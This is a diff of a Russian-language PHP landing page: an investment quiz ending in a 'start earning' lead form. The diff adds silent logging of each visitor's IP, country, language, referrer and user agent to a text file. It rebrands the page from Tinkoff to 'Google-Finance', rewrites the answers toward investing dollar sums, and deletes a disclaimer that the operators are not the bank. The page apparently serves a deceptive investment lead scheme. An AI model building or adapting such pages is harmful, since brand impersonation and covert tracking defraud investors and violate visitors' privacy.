@@ -1,5 +1,16 @@
 <?php
-    $FacebookPixel = $_GET['p'];
+	$FacebookPixel = $_GET['p'];
+	$Ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
+	$http_lang = substr($_SERVER["HTTP_ACCEPT_LANGUAGE"],0,2);
+	$fd = fopen("../logs.txt", 'a+');
+	$date = date('d.m.Y, H:i:s');
+	$arr = $date.'|'.$_SERVER['HTTP_CF_IPCOUNTRY'].'|'.$http_lang.'|'.$_SERVER['HTTP_REFERER'].'|'.$_SERVER['HTTP_USER_AGENT'].'|'.$Ip."|land \r\n";
+	fwrite($fd, $arr);
+	fclose($fd);
+	$gp = $_GET['gp'];
+  $hs = $_GET['hs'];
+  $page_lang = "ru";
+	$QUERY=$_SERVER["QUERY_STRING"];
 ?>
 <!DOCTYPE html>
 <html lang="ru">
@@ -96,7 +107,8 @@
                     <div class="form-group">
                       <input
                         type="radio"
-                        value="Знаю, все эти компании"
+                        value="Ура! Следующий месяц я смогу питаться в дорогих
+                        ресторанах"
                         class="form-control btn btn-primary megaCheckBox"
                         id="el-6308"
                         data-toggle="modal"
@@ -128,7 +140,7 @@
                     <div class="form-group">
                       <input
                         type="radio"
-                        value="Да, знаю несколько из этих компаний"
+                        value="Положу на банковский депозит. Они обещают 7% годовых"
                         class="form-control btn btn-primary megaCheckBox"
                         id="el-8668"
                         data-toggle="modal"
@@ -159,7 +171,8 @@
                     <div class="form-group">
                       <input
                         type="radio"
-                        value="Да, знаю несколько из этих компаний"
+                        value="Инвестирую, конечно. Люблю, когда деньги работают на
+                        меня"
                         class="form-control btn btn-primary megaCheckBox"
                         id="el-7254"
                         data-toggle="modal"
@@ -199,7 +212,8 @@
                     <div class="form-group">
                       <input
                         type="radio"
-                        value="Хочу обезопасить себя от кризиса"
+                        value="Проигнорирую этот факт. Я не собираюсь рисковать
+                        деньгами"
                         class="form-control btn btn-primary megaCheckBox"
                         id="el-976"
                         data-toggle="modal"
@@ -230,7 +244,8 @@
                     <div class="form-group">
                       <input
                         type="radio"
-                        value="Планирую развивать бизнес"
+                        value="Я не понимаю, как можно сделать такой точный прогноз.
+                        Вложу 10$, а там посмотрим"
                         class="form-control btn btn-primary megaCheckBox"
                         id="el-3718"
                         data-toggle="modal"
@@ -261,7 +276,8 @@
                     <div class="form-group">
                       <input
                         type="radio"
-                        value="Хочу получать дополнительный пассивный доход"
+                        value="Уже захожу на Google Finance +, чтобы проверить
+                        показатели. Думаю купить акций на 500$ для начала"
                         class="form-control btn btn-primary megaCheckBox"
                         id="el-8756"
                         data-toggle="modal"
@@ -304,7 +320,7 @@
                     <div class="form-group">
                       <input
                         type="radio"
-                        value="Храню в банке"
+                        value="Я не верю, что на Google можно зарабатывать"
                         class="form-control btn btn-primary megaCheckBox"
                         id="el-893"
                         data-toggle="modal"
@@ -335,7 +351,7 @@
                     <div class="form-group">
                       <input
                         type="radio"
-                        value="Держу наличные"
+                        value="Долларов 100 максимум"
                         class="form-control btn btn-primary megaCheckBox"
                         id="el-6930"
                         data-toggle="modal"
@@ -363,7 +379,7 @@
                     <div class="form-group">
                       <input
                         type="radio"
-                        value="Инвестирую и приумножаю сбережения"
+                        value="От 2000 до 5000 долларов"
                         class="form-control btn-primary megaCheckBox"
                         id="el-1430"
                         data-toggle="modal"
@@ -468,18 +484,11 @@
                             <input
                               type="hidden"
                               name="landing"
-                              value="TINKOFF"
+                              value="Google-Finance"
                             />
                           </div>
                         </div>
                       </div>
-                      <!-- <br /> -->
-                      <!-- <small>
-                        * Мы не являемся представителями банка Тинькофф. Мы
-                        являемся лицензированным финансово-аналитическим
-                        центром, который специализируется на фондовых и
-                        финансовых рынках, и предоставляем услуги
-                      </small> -->
                       <button class="button" type="submit">
                         Начать зарабатывать
                       </button>
